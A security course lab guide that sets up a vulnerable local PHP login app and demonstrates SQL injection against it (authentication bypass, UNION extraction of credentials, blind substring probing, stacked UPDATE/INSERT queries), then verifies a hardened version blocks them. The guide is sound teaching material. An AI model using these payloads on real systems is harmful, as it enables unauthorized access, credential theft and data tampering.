# Lab 5: SQL Injection Attack and Defense

## System and Network Security (CS5.470) — Spring 2026

---

## Table of Contents

1. [Environment Setup](#1-environment-setup)
2. [Database Setup](#2-database-setup)
3. [Running the Applications](#3-running-the-applications)
4. [Attack Demonstrations](#4-attack-demonstrations)
5. [Secure App Setup & Verification](#5-secure-app-setup--verification)
6. [Screenshots List](#6-screenshots-list)
7. [Folder Structure](#7-folder-structure)

---

## 1. Environment Setup

1. Install **XAMPP** from [https://www.apachefriends.org/](https://www.apachefriends.org/).
2. Open **XAMPP Control Panel**.
3. Start **Apache** and **MySQL**.
4. Copy the entire project folder contents into `C:\xampp\htdocs\` so that the folder structure looks like:
   ```
   C:\xampp\htdocs\
       vulnerable_app/
       secure_app/
       setup_secure.php
   ```

---

## 2. Database Setup

1. Open phpMyAdmin at: [http://localhost/phpmyadmin](http://localhost/phpmyadmin)
2. Open the **SQL** tab and run the following:

```sql
CREATE DATABASE lab5;
USE lab5;
CREATE TABLE users (
    username VARCHAR(50),
    password VARCHAR(50)
);
INSERT INTO users VALUES ('user1', 'pass1');
INSERT INTO users VALUES ('admin', 'admin123');
```

3. Verify the `users` table has 2 rows in phpMyAdmin.

---

## 3. Running the Applications

### 3.1 Vulnerable App
- URL: [http://localhost/vulnerable_app/](http://localhost/vulnerable_app/)
- Test normal login: Username: `user1`, Password: `pass1`
- Expected: "Login Successful – Welcome!" with user details shown.

### 3.2 Secure App
- URL: [http://localhost/secure_app/](http://localhost/secure_app/)
- **IMPORTANT**: Before using the secure app, you must hash the passwords.
  - Visit [http://localhost/setup_secure.php](http://localhost/setup_secure.php) **once**.
  - This converts plaintext passwords to bcrypt hashes.
- Then test login: Username: `user1`, Password: `pass1`
- **Note**: After hashing, the vulnerable app's normal login will NOT work (passwords are now hashed). To test both apps:
  1. First test all vulnerable app attacks with plaintext passwords.
  2. Then run `setup_secure.php` to hash passwords.
  3. Then test the secure app.
  4. To reset: re-run the database SQL and repeat.

---

## 4. Attack Demonstrations

> **All attacks below are performed on the vulnerable app at `http://localhost/vulnerable_app/`**

### 4.1 Authentication Bypass

**Goal**: Login without knowing any password.

| Field    | Payload                  |
|----------|--------------------------|
| Username | `' OR '1'='1' -- `       |
| Password | `anything`               |

**How it works**: The query becomes:
```sql
SELECT * FROM users WHERE username='' OR '1'='1' -- ' AND password='anything'
```
The `OR '1'='1'` is always true, and `--` comments out the password check. Login succeeds for all users.

**Alternative payload**:
| Field    | Payload                  |
|----------|--------------------------|
| Username | `admin' -- `             |
| Password | `anything`               |

This logs in specifically as `admin` by commenting out the password check.

---

### 4.2 Union-Based Injection

**Goal**: Extract all usernames and passwords from the database.

| Field    | Payload                                                |
|----------|--------------------------------------------------------|
| Username | `' UNION SELECT username, password FROM users -- `    |
| Password | `anything`                                             |

**How it works**: The query becomes:
```sql
SELECT * FROM users WHERE username='' UNION SELECT username, password FROM users -- ' AND password='anything'
```
The first SELECT returns nothing (empty username), but the UNION appends all rows from the `users` table, displaying all usernames and passwords.

---

### 4.3 Blind SQL Injection

**Goal**: Infer information using logical conditions (no direct data output).

**Test 1 — True condition** (should result in login success):
| Field    | Payload                                  |
|----------|------------------------------------------|
| Username | `' OR 1=1 -- `                           |
| Password | `anything`                               |

Result: **Login Successful** (condition is true, returns rows).

**Test 2 — False condition** (should result in login failure):
| Field    | Payload                                  |
|----------|------------------------------------------|
| Username | `' OR 1=2 -- `                           |
| Password | `anything`                               |

Result: **Login Failed** (condition is false, returns no rows).

**Analysis**: By comparing the two responses, an attacker can infer TRUE/FALSE answers about the database. For example, testing if the first character of the admin password is 'a':

| Field    | Payload                                                            |
|----------|--------------------------------------------------------------------|
| Username | `' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' -- ` |
| Password | `anything`                                                         |

If login succeeds → first character is 'a'. If fails → it's not 'a'.

---

### 4.4 Database Modification Attack (MANDATORY)

> **IMPORTANT**: Take a screenshot of phpMyAdmin **BEFORE** performing this attack!

#### Option A: Change Admin Password

| Field    | Payload                                                                |
|----------|------------------------------------------------------------------------|
| Username | `admin`                                                                |
| Password | `anything'; UPDATE users SET password='hacked' WHERE username='admin'; -- ` |

**How it works**: The stacked query first runs the SELECT (which fails), then executes:
```sql
UPDATE users SET password='hacked' WHERE username='admin'
```
The admin password is now changed to `hacked`.

**Verify**: 
1. Take a screenshot of phpMyAdmin **AFTER** → the admin's password should now be `hacked`.
2. Login with Username: `admin`, Password: `hacked` → should succeed.

#### Option B: Insert a New User

| Field    | Payload                                                              |
|----------|----------------------------------------------------------------------|
| Username | `admin`                                                              |
| Password | `anything'; INSERT INTO users VALUES('hacker','hacker123'); -- `     |

**How it works**: This inserts a new row into the `users` table.

**Verify**:
1. Take a screenshot of phpMyAdmin **AFTER** → should show 3 rows including `hacker/hacker123`.
2. Login with Username: `hacker`, Password: `hacker123` → should succeed.

---

## 5. Secure App Setup & Verification

### Setup
1. **Reset the database** (re-run the SQL from Section 2 if you modified it during attacks).
2. Run [http://localhost/setup_secure.php](http://localhost/setup_secure.php) to hash passwords.
3. Verify normal login at [http://localhost/secure_app/](http://localhost/secure_app/) with `user1 / pass1`.

### Verify All Attacks Fail

Try each attack from Section 4 on the secure app. **All must fail with "Login Failed"**:

| Attack | Username Payload | Password Payload | Expected Result |
|--------|-----------------|-------------------|-----------------|
| Auth Bypass | `' OR '1'='1' -- ` | `anything` | Login Failed |
| Union Injection | `' UNION SELECT username, password FROM users -- ` | `anything` | Login Failed |
| Blind SQLi (true) | `' OR 1=1 -- ` | `anything` | Login Failed |
| Blind SQLi (false) | `' OR 1=2 -- ` | `anything` | Login Failed |
| DB Modification | `admin` | `anything'; UPDATE users SET password='hacked' WHERE username='admin'; -- ` | Login Failed |

Take screenshots of each failed attack attempt on the secure app.

---

## 6. Screenshots List

Place all screenshots in a `Screenshots/` folder. Capture the following:

| # | Filename | Description |
|---|----------|-------------|
| 1 | `01_xampp_running.png` | XAMPP Control Panel with Apache and MySQL running |
| 2 | `02_database_setup.png` | phpMyAdmin showing the `users` table with initial data |
| 3 | `03_normal_login.png` | Successful login with `user1/pass1` on vulnerable_app |
| 4 | `04_auth_bypass.png` | Authentication bypass attack succeeding |
| 5 | `05_union_injection.png` | Union-based injection showing all users |
| 6 | `06_blind_sqli_true.png` | Blind SQLi with true condition (login success) |
| 7 | `07_blind_sqli_false.png` | Blind SQLi with false condition (login failed) |
| 8 | `08_db_before_modification.png` | phpMyAdmin BEFORE database modification attack |
| 9 | `09_db_modification_attack.png` | The modification attack being submitted |
| 10 | `10_db_after_modification.png` | phpMyAdmin AFTER modification (password changed or new user added) |
| 11 | `11_login_after_modification.png` | Successful login using the modified/new credentials |
| 12 | `12_secure_normal_login.png` | Successful normal login on secure_app |
| 13 | `13_secure_auth_bypass_fail.png` | Auth bypass FAILS on secure_app |
| 14 | `14_secure_union_fail.png` | Union injection FAILS on secure_app |
| 15 | `15_secure_blind_fail.png` | Blind SQLi FAILS on secure_app |
| 16 | `16_secure_db_mod_fail.png` | DB modification FAILS on secure_app |

---

## 7. Folder Structure

```
<group_number>_lab5/
├── vulnerable_app/
│   ├── index.php
│   ├── authentication.php
│   ├── connection.php
│   └── style.css
├── secure_app/
│   ├── index.php
│   ├── authentication.php
│   └── connection.php
├── setup_secure.php
├── Screenshots/
│   ├── 01_xampp_running.png
│   ├── ...
│   └── 16_secure_db_mod_fail.png
├── README.md
└── SECURITY.md
```
